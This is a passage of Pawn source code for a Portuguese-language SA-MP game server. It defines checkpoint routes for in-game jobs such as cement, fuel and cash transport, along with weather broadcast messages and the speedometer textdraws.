			case 25: { SetPlayerCheckpoint(playerid, 2370.410400, -1754.391845, 13.186832, 5.0); RotaJob4[playerid]=26; }
			case 26: { SetPlayerCheckpoint(playerid, 2222.277099, -1699.072143, 13.308090, 5.0); RotaJob4[playerid]=27; PausarRota(playerid, "descarrega os produtos", 3500); }
			case 27: { SetPlayerCheckpoint(playerid, 2147.466064, -1625.096435, 13.108091, 5.0); RotaJob4[playerid]=28; }
			case 28: { SetPlayerCheckpoint(playerid, 2017.213989, -1609.509765, 13.109892, 5.0); RotaJob4[playerid]=29; }
			case 29: { SetPlayerCheckpoint(playerid, 1918.733764, -1749.774658, 13.109898, 5.0); RotaJob4[playerid]=30; }
			case 30: { SetPlayerCheckpoint(playerid, 1824.698242, -1633.520019, 13.109889, 5.0); RotaJob4[playerid]=31; }
			case 31: { SetPlayerCheckpoint(playerid, 1524.665527, -1694.331420, 13.189023, 5.0); RotaJob4[playerid]=32; }
			case 32: { SetPlayerCheckpoint(playerid, 1606.787719, -1735.001831, 13.109898, 5.0); RotaJob4[playerid]=33; PausarRota(playerid, "descarrega os produtos", 3500); }
			case 33: { SetPlayerCheckpoint(playerid, 1786.523071, -1735.946777, 13.109887, 5.0); RotaJob4[playerid]=34; }
			case 34: { SetPlayerCheckpoint(playerid, 1800.774291, -1724.861450, 13.273896, 5.0); RotaJob4[playerid]=35; }
			case 35: { AcabarRota(playerid); RotaJob4[playerid]=0; DisablePlayerCheckpoint(playerid); }
		}
	}
	
	else if(pInfo[playerid][Emprego] == 5 && cInfo[car][Type] == pInfo[playerid][Emprego])
	{
		DisablePlayerCheckpoint(playerid);
		
		// format(string, sizeof(string), "Rotajob5: %d", RotaJob5[playerid]); SendClientMessage(playerid, -1, string);
		
		switch(RotaJob5[playerid]) // CIMENTEIRO
		{
			case 2: { SetPlayerCheckpoint(playerid, 1195.509643, -2442.941650, 9.548927, 5.0); RotaJob5[playerid]=3; }
			case 3: { SetPlayerCheckpoint(playerid, 1317.996582, -2479.083984, 8.192538, 5.0); RotaJob5[playerid]=4; }
			case 4: { SetPlayerCheckpoint(playerid, 1527.485839, -2686.983642, 8.401463, 5.0); RotaJob5[playerid]=5; }
			case 5: { SetPlayerCheckpoint(playerid, 1979.776977, -2687.316894, 8.427931, 5.0); RotaJob5[playerid]=6; }
			case 6: { SetPlayerCheckpoint(playerid, 2287.886474, -2291.953369, 13.102094, 5.0); RotaJob5[playerid]=7; }
			case 7: { SetPlayerCheckpoint(playerid, 2569.778564, -2172.390869, 12.675507, 5.0); RotaJob5[playerid]=8; }
			case 8: { SetPlayerCheckpoint(playerid, 2716.772460, -2123.638183, 10.570980, 5.0); RotaJob5[playerid]=9; }
			case 9: { SetPlayerCheckpoint(playerid, 2689.851318, -1969.942382, 13.273945, 5.0); RotaJob5[playerid]=10; }
			case 10: { SetPlayerCheckpoint(playerid, 2647.822265, -1959.712890, 13.273918, 5.0); RotaJob5[playerid]=11; }
			case 11: { SetPlayerCheckpoint(playerid, 2696.380859, -1969.765136, 13.273953, 5.0); RotaJob5[playerid]=12; PausarRota(playerid, "aguarda enquanto o camião enche com cimento", 6000); }
			case 12: { SetPlayerCheckpoint(playerid, 2632.482666, -1929.571044, 13.095202, 5.0); RotaJob5[playerid]=13; }
			case 13: { SetPlayerCheckpoint(playerid, 2416.301757, -1884.823120, 13.098119, 5.0); RotaJob5[playerid]=14; }
			case 14: { SetPlayerCheckpoint(playerid, 2350.689453, -1729.846313, 13.109912, 5.0); RotaJob5[playerid]=15; }
			case 15: { SetPlayerCheckpoint(playerid, 2180.809082, -1745.548706, 13.102075, 5.0); RotaJob5[playerid]=16; }
			case 16: { SetPlayerCheckpoint(playerid, 1994.668457, -1749.800415, 13.109906, 5.0); RotaJob5[playerid]=17; }
			case 17: { SetPlayerCheckpoint(playerid, 1766.135742, -1729.617309, 13.109897, 5.0); RotaJob5[playerid]=18; }
			case 18: { SetPlayerCheckpoint(playerid, 1687.844238, -1795.572509, 13.109898, 5.0); RotaJob5[playerid]=19; }
			case 19: { SetPlayerCheckpoint(playerid, 1463.097290, -1869.245483, 13.109896, 5.0); RotaJob5[playerid]=20; }
			case 20: { SetPlayerCheckpoint(playerid, 1430.064819, -1878.465698, 13.109857, 5.0); RotaJob5[playerid]=21; }
			case 21: { SetPlayerCheckpoint(playerid, 1361.803344, -1864.016601, 13.109901, 5.0); RotaJob5[playerid]=22; PausarRota(playerid, "descarrega o cimento na entrada das obras", 6000); }
			case 22: { SetPlayerCheckpoint(playerid, 1158.920410, -1849.846313, 13.122362, 5.0); RotaJob5[playerid]=23; }
			case 23: { SetPlayerCheckpoint(playerid, 1060.461547, -1834.295410, 13.249487, 5.0); RotaJob5[playerid]=24; }
			case 24: { SetPlayerCheckpoint(playerid, 865.039367, -1769.628051, 13.109903, 5.0); RotaJob5[playerid]=25; }
			case 25: { SetPlayerCheckpoint(playerid, 533.969421, -1713.422241, 12.504755, 5.0); RotaJob5[playerid]=26; }
			case 26: { SetPlayerCheckpoint(playerid, 150.064270, -1582.689086, 11.870386, 5.0); RotaJob5[playerid]=27; }
			case 27: { SetPlayerCheckpoint(playerid, 420.666168, -1720.485351, 8.901211, 5.0); RotaJob5[playerid]=28; }
			case 28: { SetPlayerCheckpoint(playerid, 847.892150, -1786.527221, 13.504014, 5.0); RotaJob5[playerid]=29; }
			case 29: { SetPlayerCheckpoint(playerid, 1043.717895, -1986.761352, 12.675237, 5.0); RotaJob5[playerid]=30; }
			case 30: { SetPlayerCheckpoint(playerid, 981.212463, -2129.506103, 13.093750, 5.0); RotaJob5[playerid]=31; }
			case 31: { AcabarRota(playerid); RotaJob5[playerid]=0; DisablePlayerCheckpoint(playerid); }
		}
	}
	
	else if(pInfo[playerid][Emprego] == 6 && cInfo[car][Type] == pInfo[playerid][Emprego])
	{
		DisablePlayerCheckpoint(playerid);
		
		// format(string, sizeof(string), "Rotajob6: %d", RotaJob6[playerid]); SendClientMessage(playerid, -1, string);
		
		switch(RotaJob6[playerid]) // LIMPA RUAS
		{
			case 2: { SetPlayerCheckpoint(playerid, 1442.434082, -1869.808349, 13.117640, 5.0); RotaJob6[playerid]=3; }
			case 3: { SetPlayerCheckpoint(playerid, 1180.124145, -1849.889282, 13.129118, 5.0); RotaJob6[playerid]=4; }
			case 4: { SetPlayerCheckpoint(playerid, 985.949462, -1783.605346, 13.802984, 5.0); RotaJob6[playerid]=5; }
			case 5: { SetPlayerCheckpoint(playerid, 656.617736, -1734.693969, 13.324475, 5.0); RotaJob6[playerid]=6; }
			case 6: { SetPlayerCheckpoint(playerid, 637.139099, -1696.007934, 14.672359, 5.0); RotaJob6[playerid]=7; }
			case 7: { SetPlayerCheckpoint(playerid, 655.926269, -1589.991455, 14.617306, 5.0); RotaJob6[playerid]=8; }
			case 8: { SetPlayerCheckpoint(playerid, 777.262023, -1556.684082, 13.109005, 5.0); RotaJob6[playerid]=9; }
			case 9: { SetPlayerCheckpoint(playerid, 844.534729, -1403.049926, 13.082881, 5.0); RotaJob6[playerid]=10; }
			case 10: { SetPlayerCheckpoint(playerid, 1000.825927, -1402.727539, 12.742891, 5.0); RotaJob6[playerid]=11; }
			case 11: { SetPlayerCheckpoint(playerid, 1059.537109, -1422.961059, 13.099648, 5.0); RotaJob6[playerid]=12; }
			case 12: { SetPlayerCheckpoint(playerid, 1034.731201, -1623.080078, 13.109899, 5.0); RotaJob6[playerid]=13; }
			case 13: { SetPlayerCheckpoint(playerid, 1070.899169, -1714.150024, 13.109889, 5.0); RotaJob6[playerid]=14; }
			case 14: { SetPlayerCheckpoint(playerid, 1280.640869, -1714.553955, 13.109888, 5.0); RotaJob6[playerid]=15; }
			case 15: { SetPlayerCheckpoint(playerid, 1294.905395, -1778.709960, 13.109897, 5.0); RotaJob6[playerid]=16; }
			case 16: { SetPlayerCheckpoint(playerid, 1349.242553, -1865.243530, 13.109895, 5.0); RotaJob6[playerid]=17; }
			case 17: { SetPlayerCheckpoint(playerid, 1529.784057, -1874.562866, 13.117373, 5.0); RotaJob6[playerid]=18; }
			case 18: { SetPlayerCheckpoint(playerid, 1621.129272, -1879.506958, 13.130603, 5.0); RotaJob6[playerid]=19; }
			case 19: { AcabarRota(playerid); RotaJob6[playerid]=0; DisablePlayerCheckpoint(playerid); }
		}
	}
	else if(pInfo[playerid][Emprego] == 7 && cInfo[car][Type] == pInfo[playerid][Emprego])
	{
		DisablePlayerCheckpoint(playerid);
		
		// format(string, sizeof(string), "Rotajob7: %d", RotaJob7[playerid]); SendClientMessage(playerid, -1, string);
		
		switch(RotaJob7[playerid]) // Lenhador
		{
			case 2: { SetPlayerCheckpoint(playerid, 1470.919677, -2234.405517, 13.109879, 5.0); RotaJob7[playerid]=3; }
			case 3: { SetPlayerCheckpoint(playerid, 1430.250000, -2313.431396, 13.109892, 5.0); RotaJob7[playerid]=4; }
			case 4: { SetPlayerCheckpoint(playerid, 1472.203247, -2341.886962, 13.109885, 5.0); RotaJob7[playerid]=5; }
			case 5: { SetPlayerCheckpoint(playerid, 1415.378662, -2375.695800, 16.875049, 5.0); RotaJob7[playerid]=6; }
			case 6: { SetPlayerCheckpoint(playerid, 1263.291503, -2340.067138, 16.496622, 5.0); RotaJob7[playerid]=7; }
			case 7: { SetPlayerCheckpoint(playerid, 1329.648803, -2442.426513, 13.102162, 5.0); RotaJob7[playerid]=8; }
			case 8: { SetPlayerCheckpoint(playerid, 1657.699707, -2686.744873, 5.594313, 5.0); RotaJob7[playerid]=9; }
			case 9: { SetPlayerCheckpoint(playerid, 2190.513916, -2497.811523, 13.106814, 5.0); RotaJob7[playerid]=10; }
			case 10: { SetPlayerCheckpoint(playerid, 2217.520019, -2646.447265, 13.270975, 5.0); RotaJob7[playerid]=11; }
			case 11: { SetPlayerCheckpoint(playerid, 2227.181640, -2585.629150, 13.155018, 5.0); RotaJob7[playerid]=12; PausarRota(playerid, "descarrega a madeira", 7000); }
			case 12: { SetPlayerCheckpoint(playerid, 2211.603271, -2491.986328, 13.125346, 5.0); RotaJob7[playerid]=13; }
			case 13: { SetPlayerCheckpoint(playerid, 2177.808837, -2445.527587, 13.102084, 5.0); RotaJob7[playerid]=14; }
			case 14: { SetPlayerCheckpoint(playerid, 2339.367675, -2239.871337, 13.102098, 5.0); RotaJob7[playerid]=15; }
			case 15: { SetPlayerCheckpoint(playerid, 2666.982666, -2172.239990, 10.653697, 5.0); RotaJob7[playerid]=16; }
			case 16: { SetPlayerCheckpoint(playerid, 2827.627197, -1886.578125, 10.664565, 5.0); RotaJob7[playerid]=17; }
			case 17: { SetPlayerCheckpoint(playerid, 2680.087646, -1871.366821, 10.610598, 5.0); RotaJob7[playerid]=18; }
			case 18: { SetPlayerCheckpoint(playerid, 2663.766113, -1660.776489, 10.428239, 5.0); RotaJob7[playerid]=19; }
			case 19: { SetPlayerCheckpoint(playerid, 2682.575683, -1607.258911, 15.038190, 5.0); RotaJob7[playerid]=20; }
			case 20: { SetPlayerCheckpoint(playerid, 2367.660156, -1601.429077, 7.870580, 5.0); RotaJob7[playerid]=21; }
			case 21: { SetPlayerCheckpoint(playerid, 1916.420898, -1501.343627, 3.001769, 5.0); RotaJob7[playerid]=22; }
			case 22: { SetPlayerCheckpoint(playerid, 1638.996948, -1488.730590, 28.321115, 5.0); RotaJob7[playerid]=23; }
			case 23: { SetPlayerCheckpoint(playerid, 1595.087280, -1736.210693, 27.647109, 5.0); RotaJob7[playerid]=24; }
			case 24: { SetPlayerCheckpoint(playerid, 1564.118652, -2101.320800, 15.961000, 5.0); RotaJob7[playerid]=25; }
			case 25: { SetPlayerCheckpoint(playerid, 1324.777587, -2246.397949, 13.109981, 5.0); RotaJob7[playerid]=26; }
			case 26: { SetPlayerCheckpoint(playerid, 1334.876831, -2197.076904, 21.428779, 5.0); RotaJob7[playerid]=27; }
			case 27: { SetPlayerCheckpoint(playerid, 1512.420043, -2197.583740, 13.102104, 5.0); RotaJob7[playerid]=28; }
			case 28: { SetPlayerCheckpoint(playerid, 1593.648193, -2181.160400, 13.282835, 5.0); RotaJob7[playerid]=29; }
			case 29: { AcabarRota(playerid); RotaJob7[playerid]=0; DisablePlayerCheckpoint(playerid); }
		}
	}
	else if(pInfo[playerid][Emprego] == 8 && cInfo[car][Type] == pInfo[playerid][Emprego])
	{
		DisablePlayerCheckpoint(playerid);
		
		// format(string, sizeof(string), "Rotajob8: %d", RotaJob8[playerid]); SendClientMessage(playerid, -1, string);

		switch(RotaJob8[playerid]) // Trans Gasolina
		{
			case 2: { SetPlayerCheckpoint(playerid, 1764.781494, -1734.388427, 13.109168, 5.0); RotaJob8[playerid]=3; }
			case 3: { SetPlayerCheckpoint(playerid, 1823.060058, -1651.739135, 13.109920, 5.0); RotaJob8[playerid]=4; }
			case 4: { SetPlayerCheckpoint(playerid, 1840.602539, -1559.377929, 13.093931, 5.0); RotaJob8[playerid]=5; }
			case 5: { SetPlayerCheckpoint(playerid, 1998.412719, -1524.611938, 3.125746, 5.0); RotaJob8[playerid]=6; }
			case 6: { SetPlayerCheckpoint(playerid, 2067.635498, -1613.419433, 13.109890, 5.0); RotaJob8[playerid]=7; }
			case 7: { SetPlayerCheckpoint(playerid, 2237.233154, -1655.309814, 15.021944, 5.0); RotaJob8[playerid]=8; }
			case 8: { SetPlayerCheckpoint(playerid, 2340.787841, -1702.189697, 13.086455, 5.0); RotaJob8[playerid]=9; }
			case 9: { SetPlayerCheckpoint(playerid, 2398.293701, -1734.337768, 13.109897, 5.0); RotaJob8[playerid]=10; }
			case 10: { SetPlayerCheckpoint(playerid, 2411.916748, -1880.355102, 13.109901, 5.0); RotaJob8[playerid]=11; }
			case 11: { SetPlayerCheckpoint(playerid, 2327.966308, -1969.843017, 13.092820, 5.0); RotaJob8[playerid]=12; }
			case 12: { SetPlayerCheckpoint(playerid, 2212.649902, -2005.751098, 13.060216, 5.0); RotaJob8[playerid]=13; }
			case 13: { SetPlayerCheckpoint(playerid, 2586.117431, -2385.742675, 13.156521, 5.0); RotaJob8[playerid]=14; }
			case 14: { SetPlayerCheckpoint(playerid, 2732.291015, -2399.325439, 13.310987, 5.0); RotaJob8[playerid]=15; }
			case 15: { SetPlayerCheckpoint(playerid, 2760.063720, -2458.333496, 13.273495, 5.0); RotaJob8[playerid]=16; PausarRota(playerid, "carrega no botão e prepara o camião para engatar o atrelado", 2500); }
			case 16: { SetPlayerCheckpoint(playerid, 2590.380615, -2501.041259, 13.219282, 5.0); RotaJob8[playerid]=17; }
			case 17: { SetPlayerCheckpoint(playerid, 2482.403076, -2610.771972, 13.227088, 5.0); RotaJob8[playerid]=18; }
			case 18: { SetPlayerCheckpoint(playerid, 2270.447998, -2660.751953, 13.199046, 5.0); RotaJob8[playerid]=19; }
			case 19: { SetPlayerCheckpoint(playerid, 2195.502929, -2493.132812, 13.127701, 5.0); RotaJob8[playerid]=20; }
			case 20: { SetPlayerCheckpoint(playerid, 2158.894531, -2551.279296, 13.102079, 5.0); RotaJob8[playerid]=21; }
			case 21: { SetPlayerCheckpoint(playerid, 1855.854614, -2668.159667, 5.594241, 5.0); RotaJob8[playerid]=22; }
			case 22: { SetPlayerCheckpoint(playerid, 1525.679199, -2668.020263, 8.504636, 5.0); RotaJob8[playerid]=23; }
			case 23: { SetPlayerCheckpoint(playerid, 1348.027221, -2451.137207, 13.102109, 5.0); RotaJob8[playerid]=24; }
			case 24: { SetPlayerCheckpoint(playerid, 1409.303222, -2288.854736, 13.109881, 5.0); RotaJob8[playerid]=25; }
			case 25: { SetPlayerCheckpoint(playerid, 1473.501098, -2363.273925, 13.109882, 5.0); RotaJob8[playerid]=26; }
			case 26: { SetPlayerCheckpoint(playerid, 1566.385498, -2381.037353, 13.102088, 5.0); RotaJob8[playerid]=27; }
			case 27: { SetPlayerCheckpoint(playerid, 1768.152587, -2380.814697, 13.102090, 5.0); RotaJob8[playerid]=28; }
			case 28: { SetPlayerCheckpoint(playerid, 1786.959106, -2190.835693, 13.105319, 5.0); RotaJob8[playerid]=29; }
			case 29: { SetPlayerCheckpoint(playerid, 1463.284301, -2237.464111, 13.109884, 5.0); RotaJob8[playerid]=30; PausarRota(playerid, "liga as mangeiras aos tanques e começa a bombear", 2000); }
			case 30: { SetPlayerCheckpoint(playerid, 1472.028808, -2353.122802, 13.109892, 5.0); RotaJob8[playerid]=31; }
			case 31: { SetPlayerCheckpoint(playerid, 1318.459716, -2375.160156, 21.424758, 5.0); RotaJob8[playerid]=32; }
			case 32: { SetPlayerCheckpoint(playerid, 1319.602416, -2401.118164, 13.102079, 5.0); RotaJob8[playerid]=33; }
			case 33: { SetPlayerCheckpoint(playerid, 1153.954101, -2394.792480, 10.663946, 5.0); RotaJob8[playerid]=34; }
			case 34: { SetPlayerCheckpoint(playerid, 1047.239868, -2098.589599, 12.683532, 5.0); RotaJob8[playerid]=35; }
			case 35: { SetPlayerCheckpoint(playerid, 1141.722900, -1854.126953, 13.109900, 5.0); RotaJob8[playerid]=36; }
			case 36: { SetPlayerCheckpoint(playerid, 1475.309936, -1874.750122, 13.110186, 5.0); RotaJob8[playerid]=37; }
			case 37: { SetPlayerCheckpoint(playerid, 1712.708007, -1815.405395, 13.086574, 5.0); RotaJob8[playerid]=38; }
			case 38: { SetPlayerCheckpoint(playerid, 1819.236083, -1882.347656, 13.116266, 5.0); RotaJob8[playerid]=39; }
			case 39: { SetPlayerCheckpoint(playerid, 1964.337402, -1906.668579, 13.109888, 5.0); RotaJob8[playerid]=40; }
			case 40: { SetPlayerCheckpoint(playerid, 1953.482299, -1788.940307, 13.109887, 5.0); RotaJob8[playerid]=41; }
			case 41: { SetPlayerCheckpoint(playerid, 1912.453369, -1749.264038, 13.109889, 5.0); RotaJob8[playerid]=42; PausarRota(playerid, "liga as mangeiras aos tanques e começa a bombear", 2000); }
			case 42: { SetPlayerCheckpoint(playerid, 1748.516967, -1730.860717, 13.118105, 5.0); RotaJob8[playerid]=43; }
			case 43: { SetPlayerCheckpoint(playerid, 1675.424194, -1723.109497, 13.282273, 5.0); RotaJob8[playerid]=44; }
			case 44: { AcabarRota(playerid); RotaJob8[playerid]=0; DisablePlayerCheckpoint(playerid); }
		}
	}
	else if(pInfo[playerid][Emprego] == 9 && cInfo[car][Type] == pInfo[playerid][Emprego])
	{
		DisablePlayerCheckpoint(playerid);
		
		// format(string, sizeof(string), "Rotajob9: %d", RotaJob9[playerid]); SendClientMessage(playerid, -1, string);

		switch(RotaJob9[playerid]) // Trans Dinheiro
		{
			case 2: { SetPlayerCheckpoint(playerid, 529.026184, -1498.420166, 14.057369, 5.0); RotaJob9[playerid]=3; }
			case 3: { SetPlayerCheckpoint(playerid, 478.421112, -1582.553955, 23.033670, 5.0); RotaJob9[playerid]=4; }
			case 4: { SetPlayerCheckpoint(playerid, 305.635986, -1581.223754, 32.707294, 5.0); RotaJob9[playerid]=5; }
			case 5: { SetPlayerCheckpoint(playerid, 261.103485, -1534.856933, 31.911603, 5.0); RotaJob9[playerid]=6; }
			case 6: { SetPlayerCheckpoint(playerid, 239.328948, -1497.298950, 22.503734, 5.0); RotaJob9[playerid]=7; }
			case 7: { SetPlayerCheckpoint(playerid, 166.625656, -1529.360351, 11.908581, 5.0); RotaJob9[playerid]=8; }
			case 8: { SetPlayerCheckpoint(playerid, 187.041946, -1621.100952, 14.161708, 5.0); RotaJob9[playerid]=9; }
			case 9: { SetPlayerCheckpoint(playerid, 590.164672, -1739.945800, 12.908811, 5.0); RotaJob9[playerid]=10; }
			case 10: { SetPlayerCheckpoint(playerid, 1003.461120, -1808.256103, 13.771069, 5.0); RotaJob9[playerid]=11; }
			case 11: { SetPlayerCheckpoint(playerid, 1050.938964, -1941.154052, 12.691331, 5.0); RotaJob9[playerid]=12; }
			case 12: { SetPlayerCheckpoint(playerid, 1194.698364, -2443.352050, 9.556321, 5.0); RotaJob9[playerid]=13; }
			case 13: { SetPlayerCheckpoint(playerid, 1401.888061, -2467.023437, 5.799724, 5.0); RotaJob9[playerid]=14; }
			case 14: { SetPlayerCheckpoint(playerid, 1523.181762, -2332.822753, -1.786332, 5.0); RotaJob9[playerid]=15; }
			case 15: { SetPlayerCheckpoint(playerid, 1475.725830, -2246.137939, -3.182357, 5.0); RotaJob9[playerid]=16; }
			case 16: { SetPlayerCheckpoint(playerid, 1426.035522, -2351.686767, 1.139221, 5.0); RotaJob9[playerid]=17; PausarRota(playerid, "espera que os seguranças carreguem o dinheiro", 5000); }
			case 17: { SetPlayerCheckpoint(playerid, 1337.884765, -2448.272705, 7.383332, 5.0); RotaJob9[playerid]=18; }
			case 18: { SetPlayerCheckpoint(playerid, 1057.068969, -2041.162353, 12.672227, 5.0); RotaJob9[playerid]=19; }
			case 19: { SetPlayerCheckpoint(playerid, 1179.231933, -1855.016357, 13.125544, 5.0); RotaJob9[playerid]=20; }
			case 20: { SetPlayerCheckpoint(playerid, 1486.006591, -1874.519775, 13.109868, 5.0); RotaJob9[playerid]=21; }
			case 21: { SetPlayerCheckpoint(playerid, 1547.747680, -1730.215576, 13.109899, 5.0); RotaJob9[playerid]=22; }
			case 22: { SetPlayerCheckpoint(playerid, 1476.113525, -1737.708496, 13.189013, 5.0); RotaJob9[playerid]=23; }
			case 23: { SetPlayerCheckpoint(playerid, 1359.905273, -1729.807495, 13.109895, 5.0); RotaJob9[playerid]=24; PausarRota(playerid, "descarrega algum dinheiro", 2500); }
			case 24: { SetPlayerCheckpoint(playerid, 1310.194458, -1790.043212, 13.109897, 5.0); RotaJob9[playerid]=25; }
			case 25: { SetPlayerCheckpoint(playerid, 1257.407592, -1849.510131, 13.109725, 5.0); RotaJob9[playerid]=26; }
			case 26: { SetPlayerCheckpoint(playerid, 1181.073364, -1795.951293, 13.125522, 5.0); RotaJob9[playerid]=27; }
			case 27: { SetPlayerCheckpoint(playerid, 1152.589477, -1626.623901, 13.508337, 5.0); RotaJob9[playerid]=28; }
			case 28: { SetPlayerCheckpoint(playerid, 1198.863891, -1487.568603, 13.109902, 5.0); RotaJob9[playerid]=29; }
			case 29: { SetPlayerCheckpoint(playerid, 1081.317993, -1393.725830, 13.294968, 5.0); RotaJob9[playerid]=30; }
			case 30: { SetPlayerCheckpoint(playerid, 487.723358, -1464.420288, 18.124185, 5.0); RotaJob9[playerid]=31; }
			case 31: { AcabarRota(playerid); RotaJob9[playerid]=0; DisablePlayerCheckpoint(playerid); }
		}
	}

	return 1;
}

public Meteo(meteoid)
{
	switch(meteoid)
	{
	    case 0:
	    {
	        SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Sol com 30ºC");
	    }
	    case 1:
	    {
	        SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Sol com 40ºC");
	    }
	    case 2:
	    {
	        SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Sol com 24ºC");
	    }
	    case 3:
	    {
	        SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de tempo Nublado com 15ºC");
	    }
	    case 5:
	    {
	        SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de tempo Nublado com 15ºC");
	    }
	    case 6:
	    {
	        SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Sol com 30ºC");
	    }
	    case 7:
	    {
	        SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Sol com 45ºC");
	    }
	    case 8:
	    {
            SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de tempo  Nublado com 15ºC");
		}
		case 9:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de tempestade e ventos fortes com 5ºC");
		}
		case 10:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Nevoeiro com 7ºC");
		}
		case 11:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Sol com 40ºC");
		}
 		case 12:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Sol com 35ºC");
		}
 		case 13:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de tempo Nublado com 15ºC");
		}
 		case 14:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Sol com 30ºC");
		}
 		case 15:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Sol com 20ºC");
		}
 		case 16:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Neblina com 10ºC");
		}
		case 17:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Chuva com 8ºC");
		}
 		case 18:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Sol com 40ºC");
		}
 		case 19:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Sol com 24ºC");

		}
 		case 20:
		{
		    SendClientMessageToAll(COLOR_CHAT, "[METEOROLOGIA:] {FFFFFF}Previsão de Tempestade de Areia com ventos fortes com 18ºC");
		}
	}

    SetWeather(meteoid);

	return 1;
}

public CarregarPlayerTextDraws(playerid)
{
	// VELOCIMETRO
	
	TDEditor_PTD[playerid][0] = CreatePlayerTextDraw(playerid, 540.666931, 348.459655, "000");
	PlayerTextDrawLetterSize(playerid, TDEditor_PTD[playerid][0], 0.265666, 1.139554);
	PlayerTextDrawAlignment(playerid, TDEditor_PTD[playerid][0], 1);
	PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_PTD[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_PTD[playerid][0], 255);
	PlayerTextDrawFont(playerid, TDEditor_PTD[playerid][0], 1);
	PlayerTextDrawSetProportional(playerid, TDEditor_PTD[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][0], 0);

	TDEditor_PTD[playerid][1] = CreatePlayerTextDraw(playerid, 545.333190, 362.563385, "000");
	PlayerTextDrawLetterSize(playerid, TDEditor_PTD[playerid][1], 0.265666, 1.139554);
	PlayerTextDrawAlignment(playerid, TDEditor_PTD[playerid][1], 1);
	PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][1], -1);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_PTD[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_PTD[playerid][1], 255);
	PlayerTextDrawFont(playerid, TDEditor_PTD[playerid][1], 1);
	PlayerTextDrawSetProportional(playerid, TDEditor_PTD[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][1], 0);

	TDEditor_PTD[playerid][2] = CreatePlayerTextDraw(playerid, 546.666564, 377.081909, "000000");
	PlayerTextDrawLetterSize(playerid, TDEditor_PTD[playerid][2], 0.265666, 1.139554);
	PlayerTextDrawAlignment(playerid, TDEditor_PTD[playerid][2], 1);
	PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_PTD[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_PTD[playerid][2], 255);
	PlayerTextDrawFont(playerid, TDEditor_PTD[playerid][2], 1);
	PlayerTextDrawSetProportional(playerid, TDEditor_PTD[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][2], 0);

	TDEditor_PTD[playerid][3] = CreatePlayerTextDraw(playerid, 522.666625, 390.355926, "(!)");
	PlayerTextDrawLetterSize(playerid, TDEditor_PTD[playerid][3], 0.265666, 1.139554);
	PlayerTextDrawAlignment(playerid, TDEditor_PTD[playerid][3], 1);
	PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][3], -1);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_PTD[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_PTD[playerid][3], 255);
	PlayerTextDrawFont(playerid, TDEditor_PTD[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid, TDEditor_PTD[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][3], 0);

	TDEditor_PTD[playerid][4] = CreatePlayerTextDraw(playerid, 531.333312, 405.704162, "00");
	PlayerTextDrawLetterSize(playerid, TDEditor_PTD[playerid][4], 0.265666, 1.139554);
	PlayerTextDrawAlignment(playerid, TDEditor_PTD[playerid][4], 1);
	PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][4], -1);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, TDEditor_PTD[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, TDEditor_PTD[playerid][4], 255);
	PlayerTextDrawFont(playerid, TDEditor_PTD[playerid][4], 1);
	PlayerTextDrawSetProportional(playerid, TDEditor_PTD[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, TDEditor_PTD[playerid][4], 0);
	
	return 1;
}

public SpawnarJogador(playerid)
{
